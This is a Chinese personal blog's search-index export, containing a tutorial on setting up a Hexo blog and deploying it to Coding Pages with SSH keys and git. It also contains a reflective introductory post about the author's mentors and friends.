<h2 id="部署Hexo"><a href="#部署Hexo" class="headerlink" title="部署Hexo"></a>部署Hexo</h2><p>这里创建一个名为hexo的文件夹，用来放置博客文件，然后在hexo文件夹内右键Git Bash，键入：    </p>
<blockquote>
<p>$ hexo init</p>
</blockquote>
<p>然后，hexo会自动在这个文件夹里生成你建立网站的所有文件。<br>到这里我们已经搭建起本地的博客了，执行以下命令，同样在hexo文件夹下右键Git Bash输入以下命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> hexo g</span></div><div class="line"><span class="meta">$</span><span class="bash"> hexo s</span></div></pre></td></tr></table></figure></p>
<p>然后在浏览器输入 <a href="http://localhost:4000" target="_blank" rel="external">http://localhost:4000</a> 可以看到当前博客效果。（最初的模板不是很耐看，我们会在后面说明更换主题。）我们需要把博客部署在网络上，这样别人才看得到。Hexo博客只支持ie8以上的浏览器。</p>
<h1 id="配置Coding"><a href="#配置Coding" class="headerlink" title="配置Coding"></a>配置Coding</h1><p>Coding是国内的网站，不用担心被墙的问题。</p>
<h2 id="注册Coding"><a href="#注册Coding" class="headerlink" title="注册Coding"></a>注册Coding</h2><p><a href="https://coding.net" target="_blank" rel="external">Coding官网</a></p>
<h2 id="添加项目"><a href="#添加项目" class="headerlink" title="添加项目"></a>添加项目</h2><p>登陆之后，新建一个空项目，名字和自己的ID一致。</p>
<h2 id="配置SSH密钥"><a href="#配置SSH密钥" class="headerlink" title="配置SSH密钥"></a>配置SSH密钥</h2><p>1.在桌面右键Bit Bash，然后键入：    </p>
<blockquote>
<p>   $ cd ~/. ssh</p>
</blockquote>
<p>如果提示：No such file or directory 说明你是第一次使用Git，请直接跳到第三步。     </p>
<p>2.如果不是第一次使用，执行下面的操作，然后跳到第四步：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> mkdir key_backup</span></div><div class="line"><span class="meta">$</span><span class="bash"> cp id_rsa* key_backup  </span></div><div class="line"><span class="meta">$</span><span class="bash"> rm id_rsa*</span></div></pre></td></tr></table></figure></p>
<p>3.生成密钥，键入:（把邮箱改成自己邮箱地址）      </p>
<blockquote>
<p>   ssh-keygen -t rsa -C “YOUR_EMAIL@YOUREMAIL.COM”</p>
</blockquote>
<p>生成过程中会让你输入passphrase口令，可以直接回车，以后出现都是空密码。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C <span class="string">"YOUR_EMAIL@YOUREMAIL.COM"</span></div><div class="line">Generating <span class="keyword">public</span>/<span class="keyword">private</span> rsa key pair.</div><div class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</div><div class="line">Enter same passphrase <span class="string">again:</span></div><div class="line">Your identification has been saved <span class="keyword">in</span> <span class="regexp">/c/</span>Users<span class="regexp">/USERNAME/</span>.ssh/id_rsa.</div><div class="line">Your <span class="keyword">public</span> key has been saved <span class="keyword">in</span> <span class="regexp">/c/</span>Users<span class="regexp">/USERNAME/</span>.ssh/id_rsa.pub.</div><div class="line">The key fingerprint <span class="string">is:</span></div><div class="line"><span class="number">15</span>:<span class="number">81</span>:<span class="string">d2:</span><span class="number">7</span><span class="string">a:</span><span class="string">c6:</span><span class="number">6</span><span class="string">c:</span><span class="number">0</span><span class="string">f:</span><span class="string">ec:</span><span class="string">b0:</span><span class="string">b6:</span><span class="string">d4:</span><span class="number">18</span>:<span class="string">b8:</span><span class="string">d1:</span><span class="number">41</span>:<span class="number">48</span> YOUR_EMAIL<span class="meta">@YOUREMAIL</span>.COM</div></pre></td></tr></table></figure></p>
<p>4.生成密钥后，在目录找到私钥 id_rsa 和公钥 id_rsa.pub 这两个文件。千万不要把私钥文件 id_rsa 透露给任何人。否则别人可以以管理员身份登录你的blog。       </p>
<p>5.在coding中添加ssh<br>使用文本工具打开id_rsa.pub,复制里面的所有内容。进入coding-&gt;项目-&gt;进入项目-&gt;左侧设置-&gt;部署公钥-&gt;新建部署公钥，公钥名称随意，在SSH-RSA公钥内容文本框中，把刚才复制的东西全部粘贴进去，然后添加。</p>
<p>6.在桌面右键Git Bash，测试是否可以连接到服务器。</p>
<blockquote>
<p>   ssh -T git@git.coding.net</p>
</blockquote>
<p>如果是第一次链接，会出现以下警告：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">The authenticity <span class="keyword">of</span> host 'git.coding.com (<span class="number">50.116</span><span class="number">.2</span><span class="number">.223</span>)' can't be established.</div><div class="line"><span class="comment">#RSA key fingerprint is 84:9e:c9:8e:7f:36:28:08:7e:13:bf:43:12:74:11:4e.</span></div><div class="line"><span class="comment">#Are you sure you want to continue connecting (yes/no)?</span></div></pre></td></tr></table></figure></p>
<p>直接输入yes，然后会提示输入passphrase，如果刚才是空密码，那么直接回车过去就好。</p>
<p>如果出现下面的字符，就说明成功了：</p>
<blockquote>
<p>   Hi USERNAME! You’ve successfully authenticated, but GitCafe does not provide shell access.</p>
</blockquote>
<h2 id="设置GIT账户信息"><a href="#设置GIT账户信息" class="headerlink" title="设置GIT账户信息"></a>设置GIT账户信息</h2><p>在桌面右键Git Bash，键入：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git config --global user<span class="selector-class">.name</span> <span class="string">"yourname"</span>                  <span class="comment">//coding上的用户名</span></div><div class="line">$ git config --global user<span class="selector-class">.email</span> <span class="string">"yourmaill@yourmaili.com"</span>  <span class="comment">//填写自己的邮箱</span></div></pre></td></tr></table></figure></p>
<h2 id="添加Pages目录"><a href="#添加Pages目录" class="headerlink" title="添加Pages目录"></a>添加Pages目录</h2><p>如果直接上传，上传上去的只是所谓的博客源码，如果我们要让我们博客显示出来，就要建立pages目录。</p>
<p>打开hexo文件夹，右键Git Bash，然后键入：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">echo <span class="string">'Hello, world'</span> &gt; index<span class="selector-class">.html</span></div><div class="line">git init</div><div class="line">git add .</div><div class="line">git commit -<span class="selector-tag">a</span> -m <span class="string">'Hello, world!'</span></div><div class="line">git remote add origin git@git<span class="selector-class">.coding</span><span class="selector-class">.net</span>:Cyris/Cyris<span class="selector-class">.git</span>     <span class="comment">//把这里的Cyris替换成自己的id</span></div><div class="line">git checkout -<span class="selector-tag">b</span> coding-pages</div><div class="line">git push origin coding-pages</div></pre></td></tr></table></figure></p>
<p>完成上面的操作，在coding的项目界面便会出现coding-pages的分支，然后进入分支界面，把默认分支改为coding-pages，删除原默认分支。</p>
<h2 id="配置Hexo的配置文件-config-yml"><a href="#配置Hexo的配置文件-config-yml" class="headerlink" title="配置Hexo的配置文件_config.yml"></a>配置Hexo的配置文件_config.yml</h2><p>配置好Hexo和coding之后，我们需要把两者联系在一起。用编辑器打开_config.yml文件（推荐sublime），打开之后把最后的deploy改为：<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">deploy</span>:</div><div class="line"><span class="attribute">type</span>: git</div><div class="line"><span class="attribute">repository</span>: git<span class="variable">@git</span>.coding.<span class="attribute">net</span>:Cyris/Cyris.git</div><div class="line"><span class="attribute">branch</span>: coding-pages</div></pre></td></tr></table></figure></p>
<p>这里使用的是nodo.js语法，这种语法对格式的要求相当高，：后必须跟上空格，不然会报错，请严格按照格式来写。</p>
<h2 id="开启Coding-Pages服务"><a href="#开启Coding-Pages服务" class="headerlink" title="开启Coding-Pages服务"></a>开启Coding-Pages服务</h2><p>登录Coding，点进项目 -&gt; 代码 -&gt; Pages服务 -&gt; 开启服务  </p>
<h2 id="绑定自定义域名"><a href="#绑定自定义域名" class="headerlink" title="绑定自定义域名"></a>绑定自定义域名</h2><p>在Coding服务页，可以输入自己的域名，然后点击添加域名绑定。然后在你的域名管理页面添加一个CNAME记录，将他指向coding-pages：cyris.coding.me，然后保存。   </p>
<h2 id="完成配置"><a href="#完成配置" class="headerlink" title="完成配置"></a>完成配置</h2><p>在Hexo目录右键Git Bash，键入：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">hexo g</span></div><div class="line">hexo d</div></pre></td></tr></table></figure></p>
<p>每次修改自己的任何配置文件，或者新建了博文，都必须输入这两个指令上传！</p>
<p>如果出现报错：</p>
<blockquote>
<p>   ERROR Deployer not found: git</p>
</blockquote>
<p>解决方法：  </p>
<blockquote>
<p>   npm install hexo-deployer-git –save</p>
</blockquote>
<p>如果没有爆出错误，说明配置成功，可以打开xxx.git.coding.net(xxx为自己的id)查看自己的博客主页。如果报错，请检查前面的配置有没有错误，如果找不到错误，请参见Hexo的常见报错.</p>
<h1 id="Hexo的优化"><a href="#Hexo的优化" class="headerlink" title="Hexo的优化"></a>Hexo的优化</h1><p>Hexo提供了一个默认主题，我们可以在官方网址寻找我们自己喜欢的主题。<br>这是我的主题yilia</p>
<p>挑选好主题之后，在hexo目录下Git Bash，键入：  </p>
<blockquote>
<p>   $ git clone <a href="https://github.com/litten/hexo-theme-yilia.git" target="_blank" rel="external">https://github.com/litten/hexo-theme-yilia.git</a> themes/yilia</p>
</blockquote>
<p>在Hexo目录下，修改_config.yml里的项目</p>
<blockquote>
<p>   theme: yilia</p>
</blockquote>
<p>然后在hexo目录下键入:</p>
<blockquote>
<p>   hexo g</p>
</blockquote>
<p>每一个主题和主题的名字都有不同，但大部分主题，都会提供详细的书写方式。</p>
<h2 id="加入多说评论系统"><a href="#加入多说评论系统" class="headerlink" title="加入多说评论系统"></a>加入多说评论系统</h2><p>1.注册多说<br>2.创建新项目，shortname用你的ID小写<br>由于博主主题只带多说评论系统插件，这里不多解释，只需要在hexo\themes\yilia下打开_config.yml，修改</p>
<blockquote>
<p>   duoshuo: Cyris</p>
</blockquote>
<h2 id="关于统计，打赏系统"><a href="#关于统计，打赏系统" class="headerlink" title="关于统计，打赏系统"></a>关于统计，打赏系统</h2><p>可以注册百度站长平台，里面有详细的使用方法。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>1.如果想要修改边框，头像，边栏超链接地址，这个一般因不同的主题而异，所以不好详述，详细要参阅对应的官方文档。</p>
<p>2.其实hexo还能添加很多不同的插件，博主修为尚浅，所以就不写出不清楚的插件用法，这里贴上一些别人的博客。Hexo的优化与定制</p>
<h1 id="Hexo的使用"><a href="#Hexo的使用" class="headerlink" title="Hexo的使用"></a>Hexo的使用</h1><p>我们终于搭好了自己的Blog，却发现并没有“写博客”的功能。</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">hexo <span class="keyword">new</span> <span class="string">"postName"</span>                     <span class="comment">#新建文章</span></div><div class="line">hexo <span class="keyword">new</span> page <span class="string">"pageName"</span>                <span class="comment">#新建页面</span></div><div class="line">hexo g                                  <span class="comment">#生成静态页面至public目录</span></div><div class="line">hexo s                                  <span class="comment">#开启预览访问端口（默认端口4000，'ctrl + c'关闭server）</span></div><div class="line">hexo d                                  <span class="comment">#将.deploy目录部署到coding</span></div></pre></td></tr></table></figure>
<p>1.第一个命令也就是最常用的命令，postname可以替换为我们想要的文章名，文章名方便记忆就好，只是在书写的时候我们能够区分就可以了，别人是看不到的。</p>
<p>2.第二个命令比较复杂，但是如果仅仅是写博文的话，第二个是用不到的。</p>
<p>3.3,5命令就不用多解释了，每次写完博文，都需要这两个命令上传。</p>
<h2 id="Markdowm语法"><a href="#Markdowm语法" class="headerlink" title="Markdowm语法"></a>Markdowm语法</h2><p>当我们输入命令，新建了一个文章，我们发现在hexo文件夹下source/_posts下生成了一个md文件，md文件是什么呢？我们首先得了解Markdown语法。（本人用Markdownpad编辑器）</p>
<h2 id="md文章头部"><a href="#md文章头部" class="headerlink" title=".md文章头部"></a>.md文章头部</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="attr">title:</span> <span class="string">postName</span>               <span class="comment">#文章页面上的显示名称，可以任意修改，不会出现在URL中</span></div><div class="line"><span class="attr">date:</span> <span class="number">2017</span><span class="bullet">-04</span><span class="bullet">-05</span> <span class="number">15</span><span class="string">:30:16</span>     <span class="comment">#文章生成时间，一般不改，当然也可以任意修改</span></div><div class="line"><span class="attr">categories:</span></div><div class="line"><span class="bullet">-</span> <span class="string">example</span>                     <span class="comment">#分类,多个分类依次</span></div><div class="line"><span class="attr">tags:</span>    </div><div class="line"><span class="bullet">-</span> <span class="string">tag1</span>                        <span class="comment">#文章标签，可空，多标签请用格式，注意:后面有个空格</span></div><div class="line"><span class="attr">description:</span>                  <span class="comment">#附加一段文章摘要，字数最好在140字以内。</span></div><div class="line"><span class="meta">---</span></div></pre></td></tr></table></figure>
<p><a href="http://www.jb51.net/article/56296.htm" target="_blank" rel="external">贴上Markdown语法</a></p>
<h2 id="关于本地图片和所属路径的问题"><a href="#关于本地图片和所属路径的问题" class="headerlink" title="关于本地图片和所属路径的问题"></a>关于本地图片和所属路径的问题</h2><p>当我们想使用我们自己的本地图片的时候，我们会纠结一件事，就是我们该把文件放在哪？路径又该怎么引用，我来解释下这个问题：</p>
<p>1.当我们编辑好我们的博文的时候，我们输入指令hexo g ，会自动生成所对应的html页面添加到hexo文件夹下的public，然后上传public，所以public便是我们的主目录。</p>
<p>2.但是我们发现public内的东西是修改不了的，所以本地图片不能存放在public中，所以我们要把图片放在source中，在source中新建img文件夹，然后建对应博文的文件夹，放置所属的图片，这样当我们需要引用本地图片的时候，则输入这样的路径(/img/Hexo_Blogs/1.png),然后我们就发现，图片没有问题了。</p>
<h1 id="写在后面的"><a href="#写在后面的" class="headerlink" title="写在后面的"></a>写在后面的</h1><p>折腾了好久，搭完的时候还是很开心的，也算是完成了一个长久以来的心愿，也希望阅读的人在看完这篇教程后能够学会搭建一个自己的小空间。    </p>
<p>再次感谢粉学姐和土土的教程，侵删。   </p>
<p>以上。</p>
]]></content>
      
        <categories>
            
            <category> Hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[写在前面的]]></title>
      <url>/2017/04/04/acaleph/</url>
      <content type="html"><![CDATA[<p>干净，深刻，精致。<br>这是那一刻的绿生，所带给我的欣喜。</p>
<a id="more"></a>
<h2 id="一、绿生"><a href="#一、绿生" class="headerlink" title="一、绿生"></a>一、绿生</h2><p>一直有搭一个个人博客的想法，现在终于做了起来。花了点时间，却也很开心。这里是Cyris的个人小站，他和阅读这篇文字的你们一样，经历和思考着这些那些。前几天和Ak师傅聊了聊，有了些新的想法，也有了下面的这些话。  </p>
<p>有事想做的兴奋存一点也不错，干干净净地着手做起来也很棒。把日子过得精致即可。这份精致，也是对生活的一种自信。“我们读诗写诗，非为它的灵巧，我们读诗写诗，因为我们是人类的一员。而人类充满了热情”，对我来说，最有魅力的，还是那些拥有自己的热情的人。这里想提提Acaleph，Aklis以及蔡师傅。  </p>
<p>蔡师傅是位地理教师，喜欢穿衬衫，卷袖子。他的课，一卷书，一张嘴，一幅画。他总能很流畅而优美地解释一些枯燥的东西，知识也好，做人也好，很是亲和。夏天吃完午饭，可以看到他靠着阳光在车里睡觉，这对于匆匆赶路的准备高考的我们来说，再棒不过。留点时间给自己。他也普通，也会抱怨，也会醉酒，也会点着烟，即使如此，他的烟味并非毫无营养，并熏染了一片人。他经历了很多我们所不能承受的东西，却也过得安和。某天有幸在路上遇到他，问，要去哪里呢，他说，去看看夫人，就在那边的餐馆里，刚开业，会忙。这让我想起来某节课上，他说，今天女儿要回来，雨大，我想就上半节课，去机场接接她。话后，教室很是安静，这半节课大家听得也很是用心。拍肩是个很简单的动作，但却感动了Cyris很久。平静却深刻的东西，最让人记忆。      </p>
<p>在面试以后就没有和Ak师傅聊过了，中间也去过几次协会，那时候刚起步学C和Python，也不知道怎么和满屋的dalao们交流，Ak说，是这样的。很久没聊了，有空过来聊聊吧。有幸遇到Ak师傅。协会的新生测试后又和他聊了聊，讲了讲从开发到学习linux和渗透等方面的东西，虽然只是一个晚上，但Cyris对下面所要做的事，更清晰了点，这站博客，只是第一步。Ak师傅影响Cyris的地方在哪呢？Acaleph说过一句话，大概是，二十岁的人去玩三岁的时候想玩的玩具就没有意义了。Ak师傅可以把知识玩起来。在早先的培训中，他在讲知识的时候，Cyris从他的眼睛里看到了一种很稀有的成分。玩也是一种艺术，能把想玩的东西玩好的人，很棒。Ak说，探求真理者不可心存傲慢。共勉。      </p>
<p>首先感谢Acaleph能让Cyris放纵喜欢，从起初的“可以说话的人”到现在各个领域的陪伴，很开心。最早见面的时候Cyris说，她就像早晨四五点的天空，虽然还没有看到具体的光亮，但那种色彩的欲出，让人兴奋不已，并开始期待着这一天，并开始期待着下一天。她有着一份优雅。Cyris很喜欢一句话，“抬头做人，低头做事”，我觉得她正是这样的一个人。她的喜欢与不喜欢很清晰，想要什么很明确，并能很努力地去尝试摘到它。我一直被一些自己不是很喜欢的理念束缚着，比如也会有没写完作业就没什么心情看自己喜欢的书什么的情况，这些都在慢慢改变。时间有限，能多做一点喜欢的事情，挺好。但这也不是一种逃脱的借口，所谓优秀，大概是最快速而质量地完成“其他任务”并精心投入到自己想完成的事中去吧ouo。愿我们都能成为我们所想成为的人。</p>
<h2 id="二、关于我"><a href="#二、关于我" class="headerlink" title="二、关于我"></a>二、关于我</h2><p>Web初学者，偶尔也会在站内发布一些文字。喜欢听着很舒服的音乐，喜欢动漫，喜欢尝试各种有趣的食物，喜欢自由地思考。如果你有什么有趣的想法，欢迎左转邮箱联系我。</p>
<p>知言养气，抓住有味。</p>
<p>以上。</p>
]]></content>
      
        <categories>
            
            <category> 煮字 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 樱花 </tag>
            
            <tag> 绿生 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
